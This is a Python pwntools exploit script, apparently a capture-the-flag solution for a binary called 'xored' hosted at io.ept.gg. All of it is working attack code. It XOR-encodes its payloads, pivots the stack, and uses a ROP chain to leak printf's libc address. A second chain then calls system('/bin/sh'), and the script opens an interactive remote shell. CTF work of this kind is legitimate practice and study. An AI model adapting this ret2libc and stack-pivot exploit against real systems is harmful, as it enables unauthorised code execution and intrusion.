#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./xored')
libc = ELF('./libc.so.6')
context.terminal=['tmux', 'split-window', '-h']

host = args.HOST or 'io.ept.gg'
port = int(args.PORT or 30012)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

def CodeIt(payload):
    key = b'\x4b\x75\x43\x4f\x4c\x63\x35\x50\x49\x48\x33\x6d\x67\x50\x36\x6e\x4a\x78\x46\x33\x44\x42\x48\x58\x62\x44\x48\x53\x71\x4d\x30\x59'
    result = b''
    for i in range(len(payload)):
        result += int.to_bytes((payload[i] ^ key[i%32]),1,'little')
    return result

pivot_gadget = 0x401266
rop_pos = 160 - 0x50 

rop = ROP(exe)
rop.puts(exe.got['printf'])
rop.raw(rop.ret.address)   #ALIGN!
rop.raw(exe.sym.main)

payload = b'\0'*rop_pos
payload += bytes(rop.chain())
payload += b'\0'*(160-8-len(payload))
payload += p64(pivot_gadget)

secur = CodeIt(payload)
log.info(f"raw 1st payload: {secur}")
io.sendafter(b'> ', secur)

io.recvuntil(b'the results:\n')
libc_leak = u64(io.recvline().strip().ljust(8, b'\0'))
log.info(f"printf @ {hex(libc_leak)}")

libc.address = libc_leak - libc.sym.printf
log.info(f"libc @ {hex(libc.address)}")

rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\0')))

payload = b'\0'*(160-0x50)
payload += bytes(rop.chain())
payload += b'\0'*(160-8-len(payload))
payload += p64(pivot_gadget)

secur = CodeIt(payload)
log.info(f"raw 2nd payload: {secur}")
io.sendafter(b'> ', secur[1:])

io.interactive()

